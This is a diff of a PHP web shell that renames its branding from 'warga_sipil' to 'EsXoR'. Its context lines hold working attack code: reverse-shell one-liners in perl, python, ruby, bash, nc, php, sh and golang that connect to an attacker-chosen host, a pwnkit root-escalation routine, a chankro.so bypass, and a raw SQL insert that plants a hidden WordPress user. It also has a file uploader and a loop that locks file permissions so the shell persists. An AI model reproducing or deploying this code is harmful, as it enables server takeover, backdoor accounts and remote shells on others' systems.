@@ -1836,7 +1836,7 @@ if ($_GET['don'] == true) {
 
                         <i class="fas fa-robot text-blue-400 text-2xl mr-2 cyber-glow"></i>
 
-                        <h1 class="text-xl font-bold cyber-font">warga_sipil<span class="text-blue-400 cyber-glow">v2.0</span></h1>
+                        <h1 class="text-xl font-bold cyber-font">EsXoR<span class="text-blue-400 cyber-glow">v2.0</span></h1>
 
                     </div>
 
@@ -1886,7 +1886,7 @@ if ($_GET['don'] == true) {
 
                         <div class="flex items-center flex-wrap gap-2">
 
-                            <input type="file" name="warga_sipil-upload" class="hidden" id="file-upload">
+                            <input type="file" name="EsXoR-upload" class="hidden" id="file-upload">
 
                             <label for="file-upload" class="bg-indigo-600 hover:bg-indigo-700 text-white px-3 py-1 rounded text-sm flex items-center cyber-btn">
 
@@ -1894,7 +1894,7 @@ if ($_GET['don'] == true) {
 
                             </label>
 
-                            <button type="submit" name="warga_sipil-up-submit" class="bg-teal-600 hover:bg-teal-700 text-white px-3 py-1 rounded text-sm flex items-center cyber-btn cyber-btn-success">
+                            <button type="submit" name="EsXoR-up-submit" class="bg-teal-600 hover:bg-teal-700 text-white px-3 py-1 rounded text-sm flex items-center cyber-btn cyber-btn-success">
 
                                 <i class="fas fa-check mr-2"></i> Submit
 
@@ -4450,7 +4450,7 @@ if ($_GET['don'] == true) {
 
                                 <div class="bg-slate-800 p-3 flex flex-wrap gap-3">
 
-                                    <select name="warga_sipil-select" class="bg-slate-700 text-white rounded px-3 py-1 text-sm flex-1 md:flex-none cyber-font">
+                                    <select name="EsXoR-select" class="bg-slate-700 text-white rounded px-3 py-1 text-sm flex-1 md:flex-none cyber-font">
 
                                         <option value="delete">Delete</option>
 
@@ -4582,7 +4582,7 @@ if ($_GET['don'] == true) {
 
                 <form action="" method="post">
 
-                    <select name="warga_sipil-bc" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3">
+                    <select name="EsXoR-bc" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3">
 
                         <option value="-">Choose Backconnect</option>
 
@@ -4846,7 +4846,7 @@ if ($_GET['don'] == true) {
 
                             $meterpreter = $en($cmdd." > test.txt");
 
-                            $viewCommandResult = '<hr><p>Result: base64 : ' . $meterpreter .'</br>If no output appears, <br>please check manually by opening '.$full_url.'<br>Or u can check command with reverse shell script<br>Powered By @ warga_sipil<br><br>';        
+                            $viewCommandResult = '<hr><p>Result: base64 : ' . $meterpreter .'</br>If no output appears, <br>please check manually by opening '.$full_url.'<br>Or u can check command with reverse shell script<br>Powered By @ EsXoR<br><br>';        
 
                             $a($full . '/chankro.so', $base($hook));
 
@@ -4994,13 +4994,13 @@ if ($_GET['don'] == true) {
 
                 <textarea class="terminal-output flex-1 overflow-auto p-4" disabled><?php
 
-                if ($fungsi[3]('.warga_sipil-root') && $fungsi[3]('pwnkit')) {
+                if ($fungsi[3]('.EsXoR-root') && $fungsi[3]('pwnkit')) {
 
-                    $response = $fungsi[11]('.warga_sipil-root');
+                    $response = $fungsi[11]('.EsXoR-root');
 
                     $r_text = explode(" ", $response);
 
-                    echo "[+] Powered By warga_sipil\n";
+                    echo "[+] Powered By EsXoR\n";
 
                     if (isset($r_text[0]) && $r_text[0] === "uid=0(root)") {
 
@@ -5034,11 +5034,11 @@ if ($_GET['don'] == true) {
 
                         if ($fungsi[3]('pwnkit32')) {
 
-                            cmd('./pwnkit32 "id" > .warga_sipil-root32');
+                            cmd('./pwnkit32 "id" > .EsXoR-root32');
 
-                            if ($fungsi[3]('.warga_sipil-root32')) {
+                            if ($fungsi[3]('.EsXoR-root32')) {
 
-                                $res2 = $fungsi[11]('.warga_sipil-root32');
+                                $res2 = $fungsi[11]('.EsXoR-root32');
 
                                 $rtxt2 = explode(" ", $res2);
 
@@ -5074,9 +5074,9 @@ if ($_GET['don'] == true) {
 
                 } else {
 
-                    $fungsi[24]('.warga_sipil-root');
+                    $fungsi[24]('.EsXoR-root');
 
-                    $fungsi[24]('.warga_sipil-root32');
+                    $fungsi[24]('.EsXoR-root32');
 
                 }
 
@@ -5710,7 +5710,7 @@ if (isset($_POST['submitwp'])) {
 
 
 
-    $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'warga_sipil', '', '', NOW(), '', 0, 'warga_sipil')";
+    $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'EsXoR', '', '', NOW(), '', 0, 'EsXoR')";
 
 
 
@@ -5824,39 +5824,39 @@ if (isset($_POST['submit-bc'])) {
 
     $PortServer = $_POST['backconnect-port'];
 
-    if ($_POST['warga_sipil-bc'] == "perl") {
+    if ($_POST['EsXoR-bc'] == "perl") {
 
         echo cmd('perl -e \'use Socket;$i="' . $HostServer . '";$p=' . $PortServer . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");' . $fungsi[16] . '("/bin/sh -i");};\'');
 
-    } else if ($_POST['warga_sipil-bc'] == "python") {
+    } else if ($_POST['EsXoR-bc'] == "python") {
 
         echo cmd('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $HostServer . '",' . $PortServer . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
 
-    } else if ($_POST['warga_sipil-bc'] == "ruby") {
+    } else if ($_POST['EsXoR-bc'] == "ruby") {
 
         echo cmd('ruby -rsocket -e\'f=TCPSocket.open("' . $HostServer . '",' . $PortServer . ').to_i;' . $fungsi[16] . ' sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');
 
-    } else if ($_POST['warga_sipil-bc'] == "bash") {
+    } else if ($_POST['EsXoR-bc'] == "bash") {
 
         echo cmd('bash -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
 
-    } else if ($_POST['warga_sipil-bc'] == "php") {
+    } else if ($_POST['EsXoR-bc'] == "php") {
 
         echo cmd('php -r \'$sock=fsockopen("' . $HostServer . '",' . $PortServer . ');' . $fungsi[16] . '("/bin/sh -i <&3 >&3 2>&3");\'');
 
-    } else if ($_POST['warga_sipil-bc'] == "nc") {
+    } else if ($_POST['EsXoR-bc'] == "nc") {
 
         echo cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' . $HostServer . ' ' . $PortServer . ' >/tmp/f');
 
-    } else if ($_POST['warga_sipil-bc'] == "sh") {
+    } else if ($_POST['EsXoR-bc'] == "sh") {
 
         echo cmd('sh -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
 
-    } else if ($_POST['warga_sipil-bc'] == "xterm") {
+    } else if ($_POST['EsXoR-bc'] == "xterm") {
 
         echo cmd('xterm -display ' . $HostServer . ':' . $PortServer);
 
-    } else if ($_POST['warga_sipil-bc'] == "golang") {
+    } else if ($_POST['EsXoR-bc'] == "golang") {
 
         echo cmd('echo \'package main;import"os/' . $fungsi[16] . '";import"net";func main(){c,_:=net.Dial("tcp","' . $HostServer . ':' . $PortServer . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');
 
@@ -5912,13 +5912,13 @@ while (True){
 
     }
 
-    if (warga_sipil_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
+    if (EsXoR_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
 
         chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
 
     }
 
-    if (warga_sipil_perm("' . __DIR__ . '") != 0555){
+    if (EsXoR_perm("' . __DIR__ . '") != 0555){
 
         chmod("' . __DIR__ . '", 0555);
 
@@ -5928,7 +5928,7 @@ while (True){
 
 
 
-function warga_sipil_perm($flename){
+function EsXoR_perm($flename){
 
     return substr(sprintf("%o", fileperms($flename)), -4);
 
@@ -5964,11 +5964,11 @@ function warga_sipil_perm($flename){
 
 }
 
-if (isset($_POST['warga_sipil-up-submit'])) {
+if (isset($_POST['EsXoR-up-submit'])) {
 
-    $namaFilenya = $_FILES['warga_sipil-upload']['name'];
+    $namaFilenya = $_FILES['EsXoR-upload']['name'];
 
-    $tmpName = $_FILES['warga_sipil-upload']['tmp_name'];
+    $tmpName = $_FILES['EsXoR-upload']['tmp_name'];
 
     if ($fungsi[29]($tmpName, $fungsi[0]() . "/" . $namaFilenya)) {
 
@@ -6120,7 +6120,7 @@ if ($_GET['terminal'] == "root") {
 
         cmd('chmod +x pwnkit');
 
-        echo cmd('./pwnkit "id" > .warga_sipil-root');
+        echo cmd('./pwnkit "id" > .EsXoR-root');
 
         echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&terminal=root">';
 
@@ -6134,7 +6134,7 @@ if (isset($_POST['submit-action'])) {
 
     $items = $_POST['check'];
 
-    if ($_POST['warga_sipil-select'] == "delete") {
+    if ($_POST['EsXoR-select'] == "delete") {
 
         foreach ($items as $it) {
 
@@ -6164,7 +6164,7 @@ if (isset($_POST['submit-action'])) {
 
         }
 
-    } else if ($_POST['warga_sipil-select'] == 'unzip') {
+    } else if ($_POST['EsXoR-select'] == 'unzip') {
 
         foreach ($items as $it) {
 
@@ -6184,7 +6184,7 @@ if (isset($_POST['submit-action'])) {
 
         }
 
-    } else if ($_POST['warga_sipil-select'] == 'zip') {
+    } else if ($_POST['EsXoR-select'] == 'zip') {
 
         foreach ($items as $it) {
 
@@ -6304,13 +6304,13 @@ if (isset($_POST['submit'])) {
 
             cmd('chmod +x pwnkit');
 
-            cmd('./pwnkit "id" > .warga_sipil-root');
+            cmd('./pwnkit "id" > .EsXoR-root');
 
             echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&rooting=True">';
 
-        } else if ($fungsi[3]('.warga_sipil-root')) {
+        } else if ($fungsi[3]('.EsXoR-root')) {
 
-            $response = $fungsi[11]('.warga_sipil-root');
+            $response = $fungsi[11]('.EsXoR-root');
 
             $r_text = explode(" ", $response);
 
@@ -6372,13 +6372,13 @@ while (True){
 
     }
 
-    if (warga_sipil_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
+    if (EsXoR_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
 
         chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
 
     } 
 
-    if (warga_sipil_perm("' . $fungsi[0]() . '") != 0555){
+    if (EsXoR_perm("' . $fungsi[0]() . '") != 0555){
 
         chmod("' . $fungsi[0]() . '", 0555);
 
@@ -6388,7 +6388,7 @@ while (True){
 
 
 
-function warga_sipil_perm($flename){
+function EsXoR_perm($flename){
 
     return substr(sprintf("%o", fileperms($flename)), -4);
 
